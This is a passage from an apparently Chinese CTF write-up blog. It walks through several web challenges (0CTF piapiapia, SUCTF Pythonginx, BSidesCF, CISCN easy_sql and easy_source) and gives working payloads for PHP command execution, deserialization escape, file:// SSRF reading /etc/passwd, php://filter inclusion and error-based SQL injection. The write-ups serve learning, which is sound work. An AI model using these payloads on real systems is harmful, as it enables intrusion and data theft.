class=\"variable\">$exp</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要知道的有，php某个版本以后可以使用函数名加<code>()</code>的方式调用函数，如</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> base_convert(<span class=\"string\">&quot;strtoupper&quot;</span>, <span class=\"number\">36</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\"><span class=\"variable\">$cos</span>=base_convert(<span class=\"string\">&quot;2927671435926243&quot;</span>, <span class=\"number\">10</span>, <span class=\"number\">36</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;\\n&quot;</span>.<span class=\"variable\">$cos</span>(<span class=\"string\">&quot;abc&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>上面代码是把字符串<strong>strtoupper</strong>赋值到变量<code>$cos</code>，然后直接使用<code>$cos()</code>执行<code>strtoupper()</code>函数。代码中使用<code>base_convert</code>函数也是这道题的一种思路哦。﹙ˊ_&gt;ˋ﹚</p>\n<p>还需要知道的是异或的时候会提示：字符串和数字不能直接异或，使用括号<code>()</code>括起来就可以了。<code>$</code>如果直接拼接到字符串上也是不可以的，需要使用形如<code>$$cos</code>才可以正确的指向变量。</p>\n<p>最终payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=<span class=\"variable\">$cos</span>=(is_finite^(<span class=\"number\">6</span>).(<span class=\"number\">4</span>)).(rad2deg^(<span class=\"number\">7</span>).(<span class=\"number\">5</span>));<span class=\"variable\">$cos</span>=<span class=\"variable\">$$cos</span>;<span class=\"variable\">$cos</span>&#123;<span class=\"number\">0</span>&#125;(<span class=\"variable\">$cos</span>&#123;<span class=\"number\">1</span>&#125;)&amp;<span class=\"number\">0</span>=system&amp;<span class=\"number\">1</span>=cat /flag</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"0CTF-2016-piapiapia\"><a href=\"#0CTF-2016-piapiapia\" class=\"headerlink\" title=\"[0CTF 2016]piapiapia\"></a>[0CTF 2016]piapiapia</h1><p>使用目录扫描发现了<a href=\"http://www.zip网站备份./\">www.zip网站备份。</a></p>\n<p>网站结构</p>\n<blockquote>\n<p>static</p>\n<p>upload</p>\n<p>class.php</p>\n<p>config.php</p>\n<p>index.php</p>\n<p>profile.php</p>\n<p>register.php</p>\n<p>update.php</p>\n</blockquote>\n<p>发现有register就去注册个试试呗</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210309102253.png\"></p>\n<p>注册成功就跳转到update.php界面了，是个修改信息的，查看源码，修改信息有手机号</p>\n<p>邮箱、昵称、图片，还用了一些正则表达式过滤，如手机必须11位、邮箱有@和点、昵称长度不大于10、图片名称使用了md5进行加密。填写信息以后跳转到了profile.php页面。注意到图片所在的标签是：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;data:image/gif;base64,.......</span></span></span><br></pre></td></tr></table></figure>\n\n<p>查看源码profile.php中是这样的</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$profile</span> = unserialize(<span class=\"variable\">$profile</span>);</span><br><span class=\"line\">\t\t<span class=\"variable\">$phone</span> = <span class=\"variable\">$profile</span>[<span class=\"string\">&#x27;phone&#x27;</span>];</span><br><span class=\"line\">\t\t<span class=\"variable\">$email</span> = <span class=\"variable\">$profile</span>[<span class=\"string\">&#x27;email&#x27;</span>];</span><br><span class=\"line\">\t\t<span class=\"variable\">$nickname</span> = <span class=\"variable\">$profile</span>[<span class=\"string\">&#x27;nickname&#x27;</span>];</span><br><span class=\"line\">\t\t<span class=\"variable\">$photo</span> = base64_encode(file_get_contents(<span class=\"variable\">$profile</span>[<span class=\"string\">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure>\n\n<p>读取文件以后使用base64加密的话上传的地方肯定是不能用图片马什么的了。还注意到使用了<code>unserialize</code>，序列化也是思路。想试试直接读flag所在文件，在config.php中找到了flag所在地</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"variable\">$config</span>[<span class=\"string\">&#x27;hostname&#x27;</span>] = <span class=\"string\">&#x27;127.0.0.1&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$config</span>[<span class=\"string\">&#x27;username&#x27;</span>] = <span class=\"string\">&#x27;root&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$config</span>[<span class=\"string\">&#x27;password&#x27;</span>] = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$config</span>[<span class=\"string\">&#x27;database&#x27;</span>] = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$flag</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><del>下载的源码肯定不会把flag直接给你</del>，要相办法读这个文件。看到了数据库配置，感觉序列化的对象应该也是从数据库读出来的，还有一个文件没有看：class.php，顺便跟进一下user对象相关的，注意到了注册和登陆都使用到了一个函数：<code>filter</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$username</span> = <span class=\"built_in\">parent</span>::filter(<span class=\"variable\">$username</span>);</span><br><span class=\"line\"><span class=\"variable\">$password</span> = <span class=\"built_in\">parent</span>::filter(<span class=\"variable\">$password</span>);</span><br></pre></td></tr></table></figure>\n\n<p>跟进一下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>) </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$escape</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"string\">&#x27;\\\\\\\\&#x27;</span>);</span><br><span class=\"line\">\t\t<span class=\"variable\">$escape</span> = <span class=\"string\">&#x27;/&#x27;</span> . implode(<span class=\"string\">&#x27;|&#x27;</span>, <span class=\"variable\">$escape</span>) . <span class=\"string\">&#x27;/&#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"variable\">$string</span> = preg_replace(<span class=\"variable\">$escape</span>, <span class=\"string\">&#x27;_&#x27;</span>, <span class=\"variable\">$string</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"variable\">$safe</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;select&#x27;</span>, <span class=\"string\">&#x27;insert&#x27;</span>, <span class=\"string\">&#x27;update&#x27;</span>, <span class=\"string\">&#x27;delete&#x27;</span>, <span class=\"string\">&#x27;where&#x27;</span>);</span><br><span class=\"line\">\t\t<span class=\"variable\">$safe</span> = <span class=\"string\">&#x27;/&#x27;</span> . implode(<span class=\"string\">&#x27;|&#x27;</span>, <span class=\"variable\">$safe</span>) . <span class=\"string\">&#x27;/i&#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> preg_replace(<span class=\"variable\">$safe</span>, <span class=\"string\">&#x27;hacker&#x27;</span>, <span class=\"variable\">$string</span>);</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>过滤<code>_</code>，select、insert、update、delete、where会被替换成<code>hacker</code>，where长度是5，hacker长度是6，敏感一点的应该想到了序列化字符串对象也是用字符串长度的，这样长度改变的话，可以使用<a href=\"https://my.oschina.net/u/3076320/blog/4372683\">PHP反序列化字符串逃逸</a>，序列化的结尾是<code>&quot;;&#125;</code>可以手动构造闭合。</p>\n<p>现在整理下思路。图片属性那里可以读文件，过滤函数会导致序列化字符串逃逸，所以就构造photo读取config.php。那么逃逸的点在哪里？电话只能是数字，邮箱需要有@等字符，图片会被md5加密，昵称哪里虽然有长度限制，但是如果我们传入数组的话就可以绕过。那么开工</p>\n<p>先上payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>⭐参考了其他的好多博客，这里的点讲的很模糊，原来长度为5的字符串变成了长度为6的，应该是更不可能读不到payload的。</p>\n<p>受到了这位师傅的博客<a href=\"https://blog.csdn.net/weixin_44077544/article/details/102703489\">[0CTF 2016]piapiapia</a>，我尝试了下<code>$profile</code>属性其实是一个<strong>关联数组</strong>，是键值对形式的，并且字符串可能是嵌套起来的，形如</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">profile</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$file</span> = <span class=\"string\">&#x27;a:2:&#123;s:8:&quot;nickname&quot;;s:5:&quot;where&quot;;s:5:&quot;photo&quot;;s:3:&quot;233&quot;;&#125;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$upload</span> =<span class=\"string\">&quot;2333&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$s1</span>= <span class=\"keyword\">new</span> profile();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize(<span class=\"variable\">$s1</span>);</span><br></pre></td></tr></table></figure>\n\n<p>结果是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:<span class=\"number\">7</span>:<span class=\"string\">&quot;profile&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;file&quot;</span>;s:<span class=\"number\">56</span>:<span class=\"string\">&quot;a:2:&#123;s:8:&quot;</span>nickname<span class=\"string\">&quot;;s:15:&quot;</span>where<span class=\"string\">&quot;;s:5:&quot;</span>photo<span class=\"string\">&quot;;s:3:&quot;</span><span class=\"number\">233</span><span class=\"string\">&quot;;&#125;&quot;</span>;s:<span class=\"number\">6</span>:<span class=\"string\">&quot;upload&quot;</span>;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;2333&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这种格式的，假如我们的payload是修改上面的upload，在一个字符串总长度s如上面的56读取所有变长的hacker以后，到了我们的payload地方，正常把我们构造的upload读取为对象，而后面真正的upload字符串就被舍去了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103923.png\"></p>\n<p>报错是因为nickname我们传入的是数组形式的，源代码里直接对数组进行操作肯定是报错的，但是我们需要的只有photo正常即可，可以看到后面我们文件更新成功了。</p>\n<p>查看页面的图片内容</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103720.png\"></p>\n<p>base64解码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103747.png\"></p>\n<hr>\n<h1 id=\"SUCTF-2019-Pythonginx\"><a href=\"#SUCTF-2019-Pythonginx\" class=\"headerlink\" title=\"[SUCTF 2019]Pythonginx\"></a>[SUCTF 2019]Pythonginx</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310100334.png\"></p>\n<p>整理一下源码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getUrl</span>():</span></span><br><span class=\"line\">    url = request.args.get(<span class=\"string\">&quot;url&quot;</span>)</span><br><span class=\"line\">    host = parse.urlparse(url).hostname</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">&#x27;suctf.cc&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;我扌 your problem? 111&quot;</span></span><br><span class=\"line\">    parts = <span class=\"built_in\">list</span>(urlsplit(url))</span><br><span class=\"line\">    host = parts[<span class=\"number\">1</span>]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">&#x27;suctf.cc&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class=\"line\">    newhost = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> host.split(<span class=\"string\">&#x27;.&#x27;</span>):</span><br><span class=\"line\">        newhost.append(h.encode(<span class=\"string\">&#x27;idna&#x27;</span>).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">    parts[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;.&#x27;</span>.join(newhost)</span><br><span class=\"line\">    <span class=\"comment\">#去掉 url 中的空格</span></span><br><span class=\"line\">    finalUrl = urlunsplit(parts).split(<span class=\"string\">&#x27; &#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">    host = parse.urlparse(finalUrl).hostname</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">&#x27;suctf.cc&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>三个if都是判断<code>host == &#39;suctf.cc&#39;</code>，但是需要最后一个host判断成功才可以读取文件，读取文件应该使用的是php伪协议，但是前面的不会了，去看wp。大概看的意思还是用unicode欺骗，相关题目[[ASIS 2019]Unicorn shop](#[ASIS 2019]Unicorn shop)，使用unicode经过解析以后还是原来的字符，但是可以绕过判断<code>==</code>，回过头来注意到了<strong>第二个</strong>if中有<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>进行了一波编码，那么问题就出在了这里。</p>\n<p>所以我们只需要找出随便一个host里字符的其他unicode值，这个值在经过编码以后还可以变成原来的字母。其他wp都找的是最后的字母<code>c</code>，那么我就找第一个字母<code>s</code>验证一下，贴一个unicode的网站：<a href=\"https://www.compart.com/en/unicode/U+0073%EF%BC%8C%E8%BF%9B%E5%85%A5%E7%BD%91%E7%AB%99%E4%BB%A5%E5%90%8E%E5%8F%AF%E4%BB%A5%E6%90%9C%E7%B4%A2%EF%BC%8C%E7%84%B6%E5%90%8E%E4%B8%8B%E9%9D%A2%E6%9C%89%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AD%97%E7%AC%A6%EF%BC%8C**%E9%9C%80%E8%A6%81%E5%A4%9A%E8%AF%95%E5%87%A0%E4%B8%AA**%E3%80%82\">https://www.compart.com/en/unicode/U+0073，进入网站以后可以搜索，然后下面有相关的字符，**需要多试几个**。</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102326.png\"></p>\n<p>我选出的是这个字符<code>𝐬</code>，我们先使用url编码一下防止参数出现错误，尝试读一下passwd：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../etc/passwd</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102513.png\"></p>\n<p>flag并不在其中，并且也不再根目录下，根据题目中有<code>nginx</code>应该是一个指路的，去读一读nginx的配置文件。从师傅那学到的nginx配置文件所在位置，以后说不定自己也用得到：</p>\n<blockquote>\n<p>配置文件存放目录：/etc/nginx、/usr/local/nginx/conf/nginx.conf</p>\n<p>主配置文件：/etc/nginx/conf/nginx.conf</p>\n<p>管理脚本：/usr/lib64/systemd/system/nginx.service</p>\n<p>模块：/usr/lisb64/nginx/modules</p>\n<p>应用程序：/usr/sbin/nginx</p>\n<p>程序默认存放位置：/usr/share/nginx/html</p>\n<p>日志默认存放位置：/var/log/nginx</p>\n</blockquote>\n<p>读配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103257.png\"></p>\n<p>读flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/fffffflag</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103323.png\"></p>\n<p>参考的博客链接：</p>\n<p><a href=\"https://www.xmsec.cc/suctf19-wp/\">https://www.xmsec.cc/suctf19-wp/</a></p>\n<p><a href=\"https://xz.aliyun.com/t/6042#toc-24\">https://xz.aliyun.com/t/6042#toc-24</a></p>\n<p><a href=\"https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf\">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>\n<hr>\n<h1 id=\"BSidesCF-2020-Had-a-bad-day\"><a href=\"#BSidesCF-2020-Had-a-bad-day\" class=\"headerlink\" title=\"[BSidesCF 2020]Had a bad day\"></a>[BSidesCF 2020]Had a bad day</h1><p>看这个标题我推一下OWRLD ORDER的<a href=\"https://www.bilibili.com/video/BV1Bb411K7Gd\">Have a nice day</a></p>\n<p>页面两个按钮，一个康狗狗照片，一个康猫猫照片，点按钮以后url就会改变为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/index.php?category=woofers</span><br></pre></td></tr></table></figure>\n\n<p>尝试输入flag会显示</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175019.png\"></p>\n<p>只能有<code>woofers</code>和<code>meowers</code>可以通过，尝试了下php的<code>filter</code>伪协议读文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175611.png\"></p>\n<p>读出来了，但是解密以后狗狗和猫猫这两个网页没啥作用：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">h4</span>&gt;</span> Woof! Woof! <span class=\"tag\">&lt;/<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;width:100%&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;img/dog/&lt;?php echo rand(1,10)?&gt;.jpg&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>多尝试以后发现可以读<code>index</code>，下面是主要的源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;category&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$file</span>))&#123;</span><br><span class=\"line\"><span class=\"keyword\">if</span>( strpos( <span class=\"variable\">$file</span>, <span class=\"string\">&quot;woofers&quot;</span> ) !==  <span class=\"literal\">false</span> || strpos( <span class=\"variable\">$file</span>, <span class=\"string\">&quot;meowers&quot;</span> ) !==  <span class=\"literal\">false</span> || strpos( <span class=\"variable\">$file</span>, <span class=\"string\">&quot;index&quot;</span>))&#123;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">include</span> (<span class=\"variable\">$file</span> . <span class=\"string\">&#x27;.php&#x27;</span>);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到if判断中需要字符串包含<code>woofers</code>、<code>meowers</code>、<code>index</code>，那么我们只需要在filter伪协议中插入字符串绕过判断即可。</p>\n<p><strong>需要知道的</strong>：filter可以设定一个或多个过滤器名称，以管道符<code>\\</code>分隔，所以构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/index.php?category=php://filter/meowers/convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>\n\n<p>读出来以后解密即可获得flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310181106.png\"></p>\n<p>搜索的时候学到了一个其他的截断</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">zip://test.zip#hello.html.php</span><br></pre></td></tr></table></figure>\n\n<p>代表当前目录下的test.zip压缩包里面的hello.html.php，于是包含成功。</p>\n"},{"title":"CISCN线上赛库存","date":"2021-08-18T09:21:24.000Z","_content":"\n# easy_sql\n\n在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是**括号单引号闭合**\n\n> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1') LIMIT 0,1' at line 1\n\n过滤的字符有union，所以尝试报错注入，查询版本号。\n\n```\nadmin') and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#\n```\n\n接下来想要通过**information_schema**库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。\n\n最后参考了网上的一篇文章：[mysql 注入 information_schema_绕过IDS过滤information_schema继续注入](https://blog.csdn.net/weixin_35867608/article/details/113937118)，模仿文章构造payload\n\n```\nadmin') and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#\n```\n\n回显为：Duplicate column name 'no'，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段\n\n```\nDuplicate column name '28d9f90a-4120-4ee8-9079-4e7613699510'\n```\n\n直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了\n\n```\nadmin') and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#\n```\n\nflag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}\n\n# easy_source\n\n使用目录扫描，扫描到了`.index.php.swo`\n\n```\n本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？\n<?php\nclass User\n{\n    private static $c = 0;\n\n    function a()\n    {\n        return ++self::$c;\n    }\n\n    function b()\n    {\n        return ++self::$c;\n    }\n\n    function c()\n    {\n        return ++self::$c;\n    }\n\n    function d()\n    {\n        return ++self::$c;\n    }\n\n    function e()\n    {\n        return ++self::$c;\n    }\n\n    function f()\n    {\n        return ++self::$c;\n    }\n\n    function g()\n    {\n        return ++self::$c;\n    }\n\n    function h()\n    {\n        return ++self::$c;\n    }\n\n    function i()\n    {\n        return ++self::$c;\n    }\n\n    function j()\n    {\n        return ++self::$c;\n    }\n\n    function k()\n    {\n        return ++self::$c;\n    }\n\n    function l()\n    {\n        return ++self::$c;\n    }\n\n    function m()\n    {\n        return ++self::$c;\n    }\n\n    function n()\n    {\n        return ++self::$c;\n    }\n\n    function o()\n    {\n        return ++self::$c;\n    }\n\n    function p()\n    {\n        return ++self::$c;\n    }\n\n    function q()\n    {\n        return ++self::$c;\n    }\n\n    function r()\n    {\n        return ++self::$c;\n    }\n\n    function s()\n    {\n        return ++self::$c;\n    }\n\n    function t()\n    {\n        return ++self::$c;\n    }\n    \n}\n\n$rc=$_GET[\"rc\"];\n$rb=$_GET[\"rb\"];\n$ra=$_GET[\"ra\"];\n$rd=$_GET[\"rd\"];\n$method= new $rc($ra, $rb);\nvar_dump($method->$rd());\n```\n\n看最后的参数列表，使用参数创建对象，并且创建对象的初始化参数需要有两个`$ra`、`$rb`\n\n，源码虽然给出了`User`类，但是不知道有什么其他的方法，这时候想到了可能使用PHP的原生类。\n\n根据提示\n\n> 虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？\n\n应该想到看不完全可能是在代码注释中，百度获取类中的代码注释，可以得到一个`ReflectionMethod`类，并且`ReflectionMethod`类中刚好有一个`getDocComment` 方法可以获得注释：\n\n> 简介：**ReflectionMethod** 类报告了一个方法的有关信息。类报告了一个方法的有关信息\n>\n> ReflectionFunctionAbstract::getDocComment — 获取注释内容\n\n源码中初始化创建对象为`new $rc($ra, $rb)`，传递了两个参数，`ReflectionMethod`类的初始化魔术方法也提供了两个参数\n\n> public ReflectionMethod::__construct ( [mixed](https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed) `$class` , string `$name` )\n\n所以构造第一个参数是User，第二个参数为源码里的那些方法名，一个一个尝试，在q方法中找到了flag的注释\n\npayload\n\n```\n?rc=ReflectionMethod&ra=User&rb=q&rd=getDocComment\n```\n\n结果\n\n```\n你能发现我吗string(152) \"/** * Increment counter * * @final * @static * @access publicCISCN{uLG8v-wGDDi-PfF4M-Pmc2U-uBqB2-} * @return int 